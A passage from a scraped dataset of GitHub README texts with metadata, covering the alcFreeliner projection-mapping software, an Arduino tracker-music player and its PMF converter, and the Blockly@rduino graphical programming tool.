"alcFreeliner\nThe Aziz! Light Crew Freeliner is a live geometric animation software built with Processing. The documentation is a little sparse and the ux is rough but powerfull. Click the following image for a video demo.\nInstallation & Launch\nHere are some instructions on how to get started with freeliner.\nDownload and install Processing 3 from https://processing.org/, the latest version should be used.\nInstall these libraries:\noscP5 (available through Processing library Manager)\nWebsockets (available through Processing library Manager)\nVideo (available through Processing library Manager)\nSimpleHTTP (download from site and extract to sketchbook/Libraries)\n[Spout] Optional for windows users\n[Syphon] Optional for MacOS users\nOpen and run alc_freeliner/freeliner_sketch with Processing\nOnce running you can point your browser to http://localhost:8000/index.html to access the browser interface\nNew Project Directory System\nWhat is?\nAlso known as a!LcFreeliner. This software is feature-full geometric animation software built for live projection mapping. Development started in fall 2013.\nIt is made with Processing. It is licensed as GNU Lesser General Public License. A official release will occur once I have solidified the new architecture developed during this semester.\nUsing a computer mouse cursor the user can create geometric forms composed of line segments. These can be created in groups, also known as segmentGroup. To facilitate this task the software has features such as centering, snapping, nudging, fixed length segments, fixed angles, grids, and mouse sensitivity adjustment.\nTemplates hold data related to how a segmentGroup will be rendered. There is 26 Templates, one per uppercase letter. The parameters are configurable via keys like \u2018s\u2019 for size, they can be set by typing a new numerical value or pressing \u2018-\u2018 and \u2018+\u2019 (actually \u2018-\u2018 and \u2018=\u2019).\nEach segmentGroup can have multiple templates. The templateManager then combines segmentGroups with their templates to create RenderableTemplates which then get rendered.\nPhilosophy\nalcFreeliner must:\nOnly require a computer with mouse, keyboard and display to run.\nCross platform.\nContent Free, aside from fonts.\nRemain lightweight for old hardware.\nFocus on improvisation.\nHow to freeLine\nPoint a projector at stuff, run the processing sketch. Navigate the space with your cursor, left click to add vertices, right click to remove them, and middle click to set their starting point.\nThe first few clicks puts down a special set of lines, they will display important info. The first three will display important info to make sense of this madness. Try to place them out of the way on a even surface so the text is legible. This is [group : 0] and thats all it does for now.\nNow hit n to create a newItem and click around to place some lines. If you have made a closed shape, you can place a center. Now hit A to add renderer A.\nTweaking Parameters\nMost lowercase keys are linked with a parameter. For example q is for colorMode. Once you press q you can change the colorMode by pressing - or = (aka +) or by typing in a number and pressing enter. Some parameters are simple toggles. For example g enables and disables the grid, but you can also alter the grid size by tweaking the value. The . works in a similar fashion where you can enable/disable snapping and adjust the snapping distance. See (https://github.com/maxdee/alc_freeliner/blob/devel/freeliner_sketch/data/doc/autodoc.md) for a detailed list.\nTweaking parameters via OSC\nParameters related to rendering can be controlled via OSC. A message /freeliner/tweak ABC q 2 will set templates A, B and C to red stroke. Typetag string string integer, the port can be set in the settings. You can find some PureData abstractions to get you started in pd_patches, great to quickly connect your midi controllers.\nSnapping\nThe cursor can snap to various stuff. When snapping to points you can nudge them with the arrow keys, shift for bigger increments. Holding ctrl will momentarily disable snapping. If ctrl is pressed when snapped, you can right click drag the point. Snapping to segment middle you can use backspace to remove the segment. . toggles snapping and allows you to set the snapping distance.\nText Entry\n| pipe begins a text entry and return key returns the text. This has a few uses. More later.\nToggle a template to groups with a template\nEssentially adds a other template of your choice to any group who has the first template on the list. Select two templates like A and B, press ctrl-b. All geometry that has A will now also have B.\nCreate a custom brush\nMake a new segment group, set its center. Add a rendering template (shift + a-z) then hit (ctrl + d). That template will now have a custom brush corresponding to that segment group. You can then remove that template from the group and or remove all the segments of the group.\nCopy parameters between templates\nUnselect with esc, then select the template to copy, then select the template to paste into, and then press ctrl-c.\nSave and load\nNow you can save a complete mapping, geometry and templates. Using ctrl-s and ctrl-o you can save and load the default files, userdata/geometry.xml and userdata/templates.xml.\nSequencing\n16 step sequencing, may change. By tweaking the > character you can move through the steps. Steps are like items, they can have multiple templates. Press the > key then add a template or two then go to the next step with = (+) and onwards. It is recommended to use enabler mode 2.\nMake Videos\nThe * character begins and stops a frame saving process. These .tiff images are saved in batches capture/clip_N. You can use Processing's movie maker tool to turn these into a video file. I recommend clearing capture/ after making some clips.\nQuitting\nFreeliner can be quit with your systems shortcut to close a window, like alt-f4 or with cmd-w on OSX.\nSyphon\nTo use Syphon, install the Syphon Processing library and remove all the double slashes (//) in the SyphonLayer.pde file.\nSpout\nTo use Spout, install the Spout Processing library and remove all the double slashes (//) in the SpoutLayer.pde file.\nAutoDoc\nFreeliner can now compile its own documentation. Due to the extendable nature of freeliner, extensions can get added to documentation automatically. Every template parameter.\nCurrent Bugs\nReport one?\nSHOUTOUTS\nMrStar\nZap\nTats\nQuessy\nJason Lewis\nBunBun\nClaireLabs\nBruno/Laika\npotluck crew\nRobocut", "link": "https://github.com/maxdee/alc_freeliner", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "alcfreeliner\nthe aziz! light crew freeliner is a live geometric animation software built with processing. the documentation is a little sparse and the ux is rough but powerfull. click the following image for a video demo.\ninstallation & launch\nhere are some instructions on how to get started with freeliner.\ndownload and install processing 3 from https://processing.org/, the latest version should be used.\ninstall these libraries:\noscp5 (available through processing library manager)\nwebsockets (available through processing library manager)\nvideo (available through processing library manager)\nsimplehttp (download from site and extract to sketchbook/libraries)\n[spout] optional for windows users\n[syphon] optional for macos users\nopen and run alc_freeliner/freeliner_sketch with processing\nonce running you can point your browser to http://localhost:8000/index.html to access the browser interface\nnew project directory system\nwhat is?\nalso known as a!lcfreeliner. this software is feature-full geometric animation software built for live projection mapping. development started in fall 2013.\nit is made with processing. it is licensed as gnu lesser general public license. a official release will occur once i have solidified the new architecture developed during this semester.\nusing a computer mouse cursor the user can create geometric forms composed of line segments. these can be created in groups, also known as segmentgroup. to facilitate this task the software has features such as centering, snapping, nudging, fixed length segments, fixed angles, grids, and mouse sensitivity adjustment.\ntemplates hold data related to how a segmentgroup will be rendered. there is 26 templates, one per uppercase letter. the parameters are configurable via keys like \u2018s\u2019 for size, they can be set by typing a new numerical value or pressing \u2018-\u2018 and \u2018+\u2019 (actually \u2018-\u2018 and \u2018=\u2019).\neach segmentgroup can have multiple templates. the templatemanager then combines segmentgroups with their templates to create renderabletemplates which then get rendered.\nphilosophy\nalcfreeliner must:\nonly require a computer with mouse, keyboard and display to run.\ncross platform.\ncontent free, aside from fonts.\nremain lightweight for old hardware.\nfocus on improvisation.\nhow to freeline\npoint a projector at stuff, run the processing sketch. navigate the space with your cursor, left click to add vertices, right click to remove them, and middle click to set their starting point.\nthe first few clicks puts down a special set of lines, they will display important info. the first three will display important info to make sense of this madness. try to place them out of the way on a even surface so the text is legible. this is [group : 0] and thats all it does for now.\nnow hit n to create a newitem and click around to place some lines. if you have made a closed shape, you can place a center. now hit a to add renderer a.\ntweaking parameters\nmost lowercase keys are linked with a parameter. for example q is for colormode. once you press q you can change the colormode by pressing - or = (aka +) or by typing in a number and pressing enter. some parameters are simple toggles. for example g enables and disables the grid, but you can also alter the grid size by tweaking the value. the . works in a similar fashion where you can enable/disable snapping and adjust the snapping distance. see (https://github.com/maxdee/alc_freeliner/blob/devel/freeliner_sketch/data/doc/autodoc.md) for a detailed list.\ntweaking parameters via osc\nparameters related to rendering can be controlled via osc. a message /freeliner/tweak abc q 2 will set templates a, b and c to red stroke. typetag string string integer, the port can be set in the settings. you can find some puredata abstractions to get you started in pd_patches, great to quickly connect your midi controllers.\nsnapping\nthe cursor can snap to various stuff. when snapping to points you can nudge them with the arrow keys, shift for bigger increments. holding ctrl will momentarily disable snapping. if ctrl is pressed when snapped, you can right click drag the point. snapping to segment middle you can use backspace to remove the segment. . toggles snapping and allows you to set the snapping distance.\ntext entry\n| pipe begins a text entry and return key returns the text. this has a few uses. more later.\ntoggle a template to groups with a template\nessentially adds a other template of your choice to any group who has the first template on the list. select two templates like a and b, press ctrl-b. all geometry that has a will now also have b.\ncreate a custom brush\nmake a new segment group, set its center. add a rendering template (shift + a-z) then hit (ctrl + d). that template will now have a custom brush corresponding to that segment group. you can then remove that template from the group and or remove all the segments of the group.\ncopy parameters between templates\nunselect with esc, then select the template to copy, then select the template to paste into, and then press ctrl-c.\nsave and load\nnow you can save a complete mapping, geometry and templates. using ctrl-s and ctrl-o you can save and load the default files, userdata/geometry.xml and userdata/templates.xml.\nsequencing\n16 step sequencing, may change. by tweaking the > character you can move through the steps. steps are like items, they can have multiple templates. press the > key then add a template or two then go to the next step with = (+) and onwards. it is recommended to use enabler mode 2.\nmake videos\nthe * character begins and stops a frame saving process. these .tiff images are saved in batches capture/clip_n. you can use processing's movie maker -----> tool !!!  to turn these into a video file. i recommend clearing capture/ after making some clips.\nquitting\nfreeliner can be quit with your systems shortcut to close a window, like alt-f4 or with cmd-w on osx.\nsyphon\nto use syphon, install the syphon processing library and remove all the double slashes (//) in the syphonlayer.pde file.\nspout\nto use spout, install the spout processing library and remove all the double slashes (//) in the spoutlayer.pde file.\nautodoc\nfreeliner can now compile its own documentation. due to the extendable nature of freeliner, extensions can get added to documentation automatically. every template parameter.\ncurrent bugs\nreport one?\nshoutouts\nmrstar\nzap\ntats\nquessy\njason lewis\nbunbun\nclairelabs\nbruno/laika\npotluck crew\nrobocut", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000401, "year": null}, {"Unnamed: 0": 2450, "autor": 410, "date": null, "content": "Few people have been asking for the source code of my Arduino music player, so I created this GitHub project. The player is able to play MOD/S3M/XM/IT music files that are stored in the MCU program memory and has been developed so that it can run within very limited memory and performance constraints while still producing decent sound. I originally developed the player for Arduino Uno, which has only 2KB of RAM, 32KB of flash memory and 8-bit MCU running at 16MHz. Below is a video showing the player in action (running on Teensy 4 + Audio Shield)\nBasic Installation Instructions\nOnce you have downloaded the project, open pmf_player.ino in Arduino IDE and compile the project for your target platform (if you have compilation issues, check the \"Issues\" section). For Teensy and MKR you can just connect DAC0 & Ground (GND) pins to an amplifier line-in to listen to the music. For Arduino AVR you'll need to build an 8-bit resistor DAC (e.g. resistor ladder) connected to data pins 0-7. To use Teensy Audio Shield change the following define from 0 to 1 in the beginning of pmf_player.h file or otherwise the player will use the onboard DAC for output. Note that Teensy 4 has no DAC and will fail to compile without the change:\n#define PFC_USE_SGTL5000_AUDIO_SHIELD 0\nFor other platforms you'll need to port the player to the platform (see \"Porting to a New Platform\" section) and output to the associated DAC. The player comes with an existing music file (aryx.s3m by Karsten Koch) that should fit any Arduino device with at least 32Kb of flash memory. You can see Aryx playing below on Arduino Uno so you know what to expect from the birth cry of your player.\nCustom Music Files\nGood place to look for music is The Mod Archive, and particularly the chiptune section as they are more likely to fit into the MCU flash memory. Arduino MCU's with larger flash memory can of course fit in larger music files, e.g. Teensy 3.6 has 1MB of flash which is enough for most mod music files. To play the music files on Windows PC, you can use OpenMPT.\nIn order to use other music files than the one that comes with the project you'll need to use PMF Converter tool. On Windows you can use command line executable in pmf_converter/bin/pmf_converter.exe. Run this tool in Windows command prompt since you'll need to pass arguments to the tool listed below (double clicking the exe in Windows Explorer will just quickly open and close command prompt and does nothing). For Linux you'll need to compile the converter first by simply running command \"make\" in pmf_converter/build/gcc directory (see makefile for more options), which will output the executable to pmf_converter/bin directory. There are also solution files for different versions of Visual Studio you can use to compile the converter also on Windows if you want to debug or make changes to it.\nThis converter will convert MOD/S3M/XM/IT files to PMF files that you can embed to the player program. PMF format is specifically designed for small memory devices by compressing the music data, and for small music files in particular you can often see significant reduction in the file size compared to MOD/S3M/XM/IT files. The format is designed so that it can be efficiently played back without any load-time processing (e.g. sample decompression) and just loaded as a data chunk to memory for playback. The data in the format is also properly aligned to avoid need for any unaligned memory accesses.\nThe PMF music data is stored in music.h file of the project, which you can create simply by running the following console command on your Windows PC:\npmf_converter -hex -o ../../pmf_player/music.h -i <mod/s3m/xm/it file>\nAfter the PMF conversion you just need to compile the sketch again and upload the program to the MCU. If you would like to be able to switch between songs without the program recompilation, you could store binary version of PMF files (i.e. convert without -hex parameter) to an SD card and copy from the SD card to a predefined buffer in MCU flash memory.\nThe converter can also output 32-bit DWORD hex codes instead of 8-bit BYTE hex codes by using -hexd switch instead of -hex switch. Use of DWORDs can substantially improve the project compilation times, particularly for large music files. When using DWORDs, you need to change uint8_t to uint32_t in the following line in pmf_player.ino:\nstatic const uint8_t PROGMEM s_pmf_file[]=\nNote that DWORD arrays aren't supported on Arduino platforms that doesn't natively support 32-bit types, which is why this isn't the default setting.\nMaking Electronic Instruments\nThe player supports controlling individual audio channels from code to enable creation of electronic instruments. You can override the data for note, instrument/sample, volume and audio effect programmatically for each row & channel as the music advances. pmf_player.ino has a simple example which adds an extra audio channel for the music playback and adds a drum hit programmatically every 8th row (see row_callback_test() function and commented-out setup in setup() function).\nFor instruments without any pre-recorded music playing on the background, you can create a MOD/S3M/IT/XM with one empty pattern long playlist and the instruments you like to use, for example using OpenMPT. However, when converting the file to PMF, pmf_converter strips out all unreferenced instruments and eliminates empty channels. To avoid this use command-line argument \"-dro\" for the converter:\npmf_converter -hex -dro -o ../../pmf_player/music.h -i <mod/s3m/xm/it file>\nThis will keep all the instrument data intact and available for programmatic playback while not playing any sounds by itself.\nPorting to a New Platform\nIf the Arduino platform you try to compile the project for isn't supported, you'll need to implement some of the functions for the platform. Most of the code is platform agnostic, but few of the pmf_player functions require special implementations, namely:\nget_sampling_freq(uint32_t sampling_freq_) const\nstart_playback(uint32_t sampling_freq_)\nstop_playback()\nmix_buffer(pmf_mixer_buffer &buf_, unsigned num_samples_)\nget_mixer_buffer()\nget_sampling_freq() returns the closest supported sampling frequency matching the requested frequency. The MCU isn't likely able to reproduce exactly the requested frequency so this function is used to adjust the player to match the actual supported frequency. It's fine to return the requested frequency from the function since the pitch error should be pretty minor and other errors in playback probably hide this anyway (e.g. the used 8.8fp sample step).\nstart_playback() is probably the most challenging to implement since it needs to setup an interrupt to run at given frequency, and the interrupt function to feed data to the DAC. pmf_audio_buffer can be used for the master audio buffer implementation and to fetch audio data in the interrupt in given bit depth to be fed to the DAC.\nstop_playback() just need to stop the interrupt from running.\nmix_buffer() mixes all active audio channel samples with given sampling rate and volume to the master buffer. There's a reference implementation mix_buffer_impl() that can be used for the initial implementation. However, for more optimal implementation, this function can be written in hand optimized platform specific assembly language (see the AVR implementation for example). This function is the most performance intensive part of the player and dominates how many audio channels you can mix at most and in what kind of frequency, or how much spare computing resources you have left for doing other things while the music is playing.\nget_mixer_buffer() just returns the master audio buffer to the player for some processing.\nIssues\nIf you compile the project for a device with very limited RAM (like 2KB on Arduino Uno) the sketch compilation may fail because of insufficient RAM. You can easily reduce the RAM usage by reducing the number of supported audio channels (12 by default). The number of supported channels is defined in pmf_player.h file with pmfplayer_max_channels value. The number of channels the player needs to have at minimum depends on the music file, which is shown in \"Channels\" in the beginning of music.h (e.g. 12 for aryx.s3m). If you define less channels than is required by the music file, the player will just ignore the extra channels.\nAnother potential problem is that when you try to compile the project you'll get \"undefined reference\" errors for functions get_sampling_freq(), start_playback(), stop_playback(), mix_buffer() and get_mixer_buffer(). This is because these functions are not implemented for the device you are compiling the project for. Check out \"Porting to a New Platform\" for to address this issue.\nThe music playback may not sound the same as it does with OpenMPT and there are many potentially reasons for it. One potential reason is that the effects used in the music file are not supported by the player, or are not implemented to the spec (which are very vague). There are also potential bugs in the player/converter that can cause playback issues. Also check for potential warnings upon the music file conversion.\nClosing Words\nIf you find bugs or make other improvements to the player don't hesitate to drop me a line! This is just a hobby project of mine so I work on it pretty irregularly, but I'm happy to get updates and share the work with other Arduino music enthusiasts.\nCheers, Jarkko", "link": "https://github.com/JarkkoPFC/arduino-music-player", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "few people have been asking for the source code of my arduino music player, so i created this github project. the player is able to play mod/s3m/xm/it music files that are stored in the mcu program memory and has been developed so that it can run within very limited memory and performance constraints while still producing decent sound. i originally developed the player for arduino uno, which has only 2kb of ram, 32kb of flash memory and 8-bit mcu running at 16mhz. below is a video showing the player in action (running on teensy 4 + audio shield)\nbasic installation instructions\nonce you have downloaded the project, open pmf_player.ino in arduino ide and compile the project for your target platform (if you have compilation issues, check the \"issues\" section). for teensy and mkr you can just connect dac0 & ground (gnd) pins to an amplifier line-in to listen to the music. for arduino avr you'll need to build an 8-bit resistor dac (e.g. resistor ladder) connected to data pins 0-7. to use teensy audio shield change the following define from 0 to 1 in the beginning of pmf_player.h file or otherwise the player will use the onboard dac for output. note that teensy 4 has no dac and will fail to compile without the change:\n#define pfc_use_sgtl5000_audio_shield 0\nfor other platforms you'll need to port the player to the platform (see \"porting to a new platform\" section) and output to the associated dac. the player comes with an existing music file (aryx.s3m by karsten koch) that should fit any arduino device with at least 32kb of flash memory. you can see aryx playing below on arduino uno so you know what to expect from the birth cry of your player.\ncustom music files\ngood place to look for music is the mod archive, and particularly the chiptune section as they are more likely to fit into the mcu flash memory. arduino mcu's with larger flash memory can of course fit in larger music files, e.g. teensy 3.6 has 1mb of flash which is enough for most mod music files. to play the music files on windows pc, you can use openmpt.\nin order to use other music files than the one that comes with the project you'll need to use pmf converter -----> tool !!! . on windows you can use command line executable in pmf_converter/bin/pmf_converter.exe. run this tool in windows command prompt since you'll need to pass arguments to the tool listed below (double clicking the exe in windows explorer will just quickly open and close command prompt and does nothing). for linux you'll need to compile the converter first by simply running command \"make\" in pmf_converter/build/gcc directory (see makefile for more options), which will output the executable to pmf_converter/bin directory. there are also solution files for different versions of visual studio you can use to compile the converter also on windows if you want to debug or make changes to it.\nthis converter will convert mod/s3m/xm/it files to pmf files that you can embed to the player program. pmf format is specifically designed for small memory devices by compressing the music data, and for small music files in particular you can often see significant reduction in the file size compared to mod/s3m/xm/it files. the format is designed so that it can be efficiently played back without any load-time processing (e.g. sample decompression) and just loaded as a data chunk to memory for playback. the data in the format is also properly aligned to avoid need for any unaligned memory accesses.\nthe pmf music data is stored in music.h file of the project, which you can create simply by running the following console command on your windows pc:\npmf_converter -hex -o ../../pmf_player/music.h -i <mod/s3m/xm/it file>\nafter the pmf conversion you just need to compile the sketch again and upload the program to the mcu. if you would like to be able to switch between songs without the program recompilation, you could store binary version of pmf files (i.e. convert without -hex parameter) to an sd card and copy from the sd card to a predefined buffer in mcu flash memory.\nthe converter can also output 32-bit dword hex codes instead of 8-bit byte hex codes by using -hexd switch instead of -hex switch. use of dwords can substantially improve the project compilation times, particularly for large music files. when using dwords, you need to change uint8_t to uint32_t in the following line in pmf_player.ino:\nstatic const uint8_t progmem s_pmf_file[]=\nnote that dword arrays aren't supported on arduino platforms that doesn't natively support 32-bit types, which is why this isn't the default setting.\nmaking electronic instruments\nthe player supports controlling individual audio channels from code to enable creation of electronic instruments. you can override the data for note, instrument/sample, volume and audio effect programmatically for each row & channel as the music advances. pmf_player.ino has a simple example which adds an extra audio channel for the music playback and adds a drum hit programmatically every 8th row (see row_callback_test() function and commented-out setup in setup() function).\nfor instruments without any pre-recorded music playing on the background, you can create a mod/s3m/it/xm with one empty pattern long playlist and the instruments you like to use, for example using openmpt. however, when converting the file to pmf, pmf_converter strips out all unreferenced instruments and eliminates empty channels. to avoid this use command-line argument \"-dro\" for the converter:\npmf_converter -hex -dro -o ../../pmf_player/music.h -i <mod/s3m/xm/it file>\nthis will keep all the instrument data intact and available for programmatic playback while not playing any sounds by itself.\nporting to a new platform\nif the arduino platform you try to compile the project for isn't supported, you'll need to implement some of the functions for the platform. most of the code is platform agnostic, but few of the pmf_player functions require special implementations, namely:\nget_sampling_freq(uint32_t sampling_freq_) const\nstart_playback(uint32_t sampling_freq_)\nstop_playback()\nmix_buffer(pmf_mixer_buffer &buf_, unsigned num_samples_)\nget_mixer_buffer()\nget_sampling_freq() returns the closest supported sampling frequency matching the requested frequency. the mcu isn't likely able to reproduce exactly the requested frequency so this function is used to adjust the player to match the actual supported frequency. it's fine to return the requested frequency from the function since the pitch error should be pretty minor and other errors in playback probably hide this anyway (e.g. the used 8.8fp sample step).\nstart_playback() is probably the most challenging to implement since it needs to setup an interrupt to run at given frequency, and the interrupt function to feed data to the dac. pmf_audio_buffer can be used for the master audio buffer implementation and to fetch audio data in the interrupt in given bit depth to be fed to the dac.\nstop_playback() just need to stop the interrupt from running.\nmix_buffer() mixes all active audio channel samples with given sampling rate and volume to the master buffer. there's a reference implementation mix_buffer_impl() that can be used for the initial implementation. however, for more optimal implementation, this function can be written in hand optimized platform specific assembly language (see the avr implementation for example). this function is the most performance intensive part of the player and dominates how many audio channels you can mix at most and in what kind of frequency, or how much spare computing resources you have left for doing other things while the music is playing.\nget_mixer_buffer() just returns the master audio buffer to the player for some processing.\nissues\nif you compile the project for a device with very limited ram (like 2kb on arduino uno) the sketch compilation may fail because of insufficient ram. you can easily reduce the ram usage by reducing the number of supported audio channels (12 by default). the number of supported channels is defined in pmf_player.h file with pmfplayer_max_channels value. the number of channels the player needs to have at minimum depends on the music file, which is shown in \"channels\" in the beginning of music.h (e.g. 12 for aryx.s3m). if you define less channels than is required by the music file, the player will just ignore the extra channels.\nanother potential problem is that when you try to compile the project you'll get \"undefined reference\" errors for functions get_sampling_freq(), start_playback(), stop_playback(), mix_buffer() and get_mixer_buffer(). this is because these functions are not implemented for the device you are compiling the project for. check out \"porting to a new platform\" for to address this issue.\nthe music playback may not sound the same as it does with openmpt and there are many potentially reasons for it. one potential reason is that the effects used in the music file are not supported by the player, or are not implemented to the spec (which are very vague). there are also potential bugs in the player/converter that can cause playback issues. also check for potential warnings upon the music file conversion.\nclosing words\nif you find bugs or make other improvements to the player don't hesitate to drop me a line! this is just a hobby project of mine so i work on it pretty irregularly, but i'm happy to get updates and share the work with other arduino music enthusiasts.\ncheers, jarkko", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000410, "year": null}, {"Unnamed: 0": 2451, "autor": 411, "date": null, "content": "Thanks for donation with Paypal to help me improve this software.\nPROFS FRANCAIS & ASSOCIATIONS\nvous pouvez aussi me demander une facture pour que votre \u00e9tablissement me fasse un 'don' officiel par virement bancaire. Je ne fais pas payer de licence mais je compte sur vous pour aider du montant auquel vous estimez ce travail.\nWIKI !!! http://www.libreduc.cc/wiki/doku.php/en/blockly_rduino\nFORUM !!! http://blockly.technologiescollege.fr/forum\nOff-line upload https://github.com/technologiescollege/BlocklyArduino_electrified\nOff-line upload & supervision https://github.com/technologiescollege/BlocklyArduino_AIO\nInternet Explorer banni ! Internet Explorer banned!\nMultilingual version of Blockly@rduino\nBlockly@rduino est un programme web, un webware graphique permettant la programmation graphique pour Arduino et sa traduction en code.\nBlockly@rduino is a web program, a graphic webware allowing graphic programming for Arduino and its translation into code.\nBlockly@rduino est bas\u00e9 sur Blockly, un \u00e9diteur de programme graphique par une interface web. Il fournit un seul type de traduction de la programmation graphique (contrairement \u00e0 Blockly qui traduit en Python, en JavaScript, etc et permet de le simuler en ligne : exemple), pour g\u00e9n\u00e9rer du code \u00e0 copier coller dans l'EDI Arduino.\nBlockly@rduino is based on Blockly, a web-based graphical program editor. It provides a single type of graphical programming translation (unlike Blockly, which translates to Python, JavaScript, etc. and allows you to simulate it online : example), to generate code to be copied and pasted into the Arduino IDE.\nLibre \u00e0 vous de rajouter autant de biblioth\u00e8ques que voulu gr\u00e2ce \u00e0 cette notice explicative : http://www.libreduc.cc/wiki/doku.php/fr/arduino/blockly_rduino/creerblocsmultiling\nFeel free to add as many libraries as you want thanks to this explanatory note: http://www.libreduc.cc/wiki/doku.php/fr/arduino/blockly_rduino/creerblocsmultiling\nCette version a \u00e9t\u00e9 r\u00e9organis\u00e9e et am\u00e9lior\u00e9e pour la faire utiliser au mieux par des \u00e9l\u00e8ves d\u00e9butants dans le code.\nToutes les remarques sont les bienvenues pour am\u00e9liorer la syntaxe !\nThis version has been organized and improved to make it best used by students who are new to the code.\nAll remarks are welcome to improve the syntax !\nFonctions\nprogrammation pour Arduino en drag'n'drop graphique,\ng\u00e9n\u00e8re un code totalement compatible avec le code Arduino,\ninteraction des cartes Arduino gr\u00e2ce aux modules rajout\u00e9s : plus de 10 blocs sp\u00e9cifiques \u00e0 des capteurs/actionneurs Grove, ainsi que ceux de TechnoZone51, Bitbloq, et ...\npossibilit\u00e9 de charger automatiquement des fichiers sur le site gr\u00e2ce aux param\u00e8tres de l'adresse URL _(voir les d\u00e9mos ci-dessous).\nt\u00e9l\u00e9versement et console s\u00e9rie depuis l'interface web,\nsauvegarde/lecture de fichiers INO et XML\ncr\u00e9ation d'exemples\nsupervision de la carte en temps r\u00e9el gr\u00e2ce au serveur PyMata-AIO (accessible depuis le panneau de contr\u00f4le\nFunctions\nprogramming for Arduino in drag'n'drop graphic\ngenerates a code fully compatible with the Arduino code\ninteraction of Arduino boards thanks to the added modules: more than 10 blocks specific to Grove sensors/actuators, as well as those of TechnoZone51, Bitbloq, and ...\nability to automatically upload files to the site thanks to the parameters of the URL address _(see the demos below)\nupload and serial console from the web interface\nbackup/reading of INO and XML files\ncreation of examples\nreal-time supervision of the map thanks to the PyMata-AIO server (accessible from the control panel\nD\u00e9mos\nBlockly@rduino est un outil web, un webware par r\u00e9f\u00e9rence aux software, hardware, etc. Vous pouvez le tester/utiliser \u00e0 l'adresse suivante : http://technologiescollege.github.io/Blockly-at-rduino/\nVous pouvez donc aussi lier directement l'ouverture de la page \u00e0 l'ouverture d'un fichier XML h\u00e9berg\u00e9 (ou tout en local) :\nd\u00e9mo 1 : faire clignoter une diode\nd\u00e9mo 2 : faire varier un servo-moteur proportionnellement \u00e0 une consigne de potentiom\u00e8tre\nDemos\nBlockly@rduino is a web tool, a webware by reference to software, hardware, etc.. You can test/use it at the following address : http://technologiescollege.github.io/Blockly-at-rduino/\nSo you can also link directly the opening of the page to the opening of a hosted XML file (or all locally) :\ndemo 1: flashing a diode\ndemo 2: vary a servo-motor proportionally to a potentiometer setpoint\nUtiliser en local dans son navigateur web\nSi vous pr\u00e9fr\u00e9ez l'utiliser en local, il vous suffit de t\u00e9l\u00e9charger le code depuis Github (Download Zip) et d'ouvrir le fichier index.html dans votre navigateur.\nVous pouvez l'h\u00e9berger sur un serveur, et ainsi y faire acc\u00e9der de nombreux postes en pointant vers ce fichier 'index.html'.\nPour le t\u00e9l\u00e9versement et la console s\u00e9rie, vous devez t\u00e9l\u00e9charger la version 'Electron' : https://github.com/technologiescollege/BlocklyArduino_electrified.\nUse locally in your web browser\nIf you want to use it locally, just download the code from Github (Download Zip) and open the file index.html in your browser.\nYou can host it on a server, and thus make many computers access it by pointing to this file `index.html'.\nFor the upload and the serial console, you have to download the 'Electron' version : https://github.com/technologiescollege/BlocklyArduino_electrified.\nAuteurs et contributeurs\nProgramme Blockly : https://developers.google.com/blockly/\nConcept d'origine BlocklyDuino : Fred Lin (@gasolin https://github.com/gasolin/BlocklyDuino).\nSon projet s'est aussi inspir\u00e9 de ardublock et modkit.\nFonctions de typage ArduBlockly : Carlos Pereira Atencio (https://github.com/carlosperate/ardublockly).\nInt\u00e9gration de CodeBender : Julien Rat https://github.com/julienrat\nR\u00e9-\u00e9criture totale et refonte graphique : Olivier M\u00e9tayer\nJulien RAT : CodeBender plugin\nFr\u00e9d\u00e9ric PICARD : bitbloq, maquette Jeulin, vid\u00e9os, etc\nSpanish translation : Jos\u00e9 Manuel Ruiz Gutteriez (blog)\nDaniel PERS (site) : FDPlayer, OLED, RGB LED\nBernard REMOND site : t\u00e9l\u00e9versement local", "link": "https://github.com/technologiescollege/Blockly-at-rduino", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "thanks for donation with paypal to help me improve this software.\nprofs francais & associations\nvous pouvez aussi me demander une facture pour que votre \u00e9tablissement me fasse un 'don' officiel par virement bancaire. je ne fais pas payer de licence mais je compte sur vous pour aider du montant auquel vous estimez ce travail.\nwiki !!! http://www.libreduc.cc/wiki/doku.php/en/blockly_rduino\nforum !!! http://blockly.technologiescollege.fr/forum\noff-line upload https://github.com/technologiescollege/blocklyarduino_electrified\noff-line upload & supervision https://github.com/technologiescollege/blocklyarduino_aio\ninternet explorer banni ! internet explorer banned!\nmultilingual version of blockly@rduino\nblockly@rduino est un programme web, un webware graphique permettant la programmation graphique pour arduino et sa traduction en code.\nblockly@rduino is a web program, a graphic webware allowing graphic programming for arduino and its translation into code.\nblockly@rduino est bas\u00e9 sur blockly, un \u00e9diteur de programme graphique par une interface web. il fournit un seul type de traduction de la programmation graphique (contrairement \u00e0 blockly qui traduit en python, en javascript, etc et permet de le simuler en ligne : exemple), pour g\u00e9n\u00e9rer du code \u00e0 copier coller dans l'edi arduino.\nblockly@rduino is based on blockly, a web-based graphical program editor. it provides a single type of graphical programming translation (unlike blockly, which translates to python, javascript, etc. and allows you to simulate it online : example), to generate code to be copied and pasted into the arduino ide.\nlibre \u00e0 vous de rajouter autant de biblioth\u00e8ques que voulu gr\u00e2ce \u00e0 cette notice explicative : http://www.libreduc.cc/wiki/doku.php/fr/arduino/blockly_rduino/creerblocsmultiling\nfeel free to add as many libraries as you want thanks to this explanatory note: http://www.libreduc.cc/wiki/doku.php/fr/arduino/blockly_rduino/creerblocsmultiling\ncette version a \u00e9t\u00e9 r\u00e9organis\u00e9e et am\u00e9lior\u00e9e pour la faire utiliser au mieux par des \u00e9l\u00e8ves d\u00e9butants dans le code.\ntoutes les remarques sont les bienvenues pour am\u00e9liorer la syntaxe !\nthis version has been organized and improved to make it best used by students who are new to the code.\nall remarks are welcome to improve the syntax !\nfonctions\nprogrammation pour arduino en drag'n'drop graphique,\ng\u00e9n\u00e8re un code totalement compatible avec le code arduino,\ninteraction des cartes arduino gr\u00e2ce aux modules rajout\u00e9s : plus de 10 blocs sp\u00e9cifiques \u00e0 des capteurs/actionneurs grove, ainsi que ceux de technozone51, bitbloq, et ...\npossibilit\u00e9 de charger automatiquement des fichiers sur le site gr\u00e2ce aux param\u00e8tres de l'adresse url _(voir les d\u00e9mos 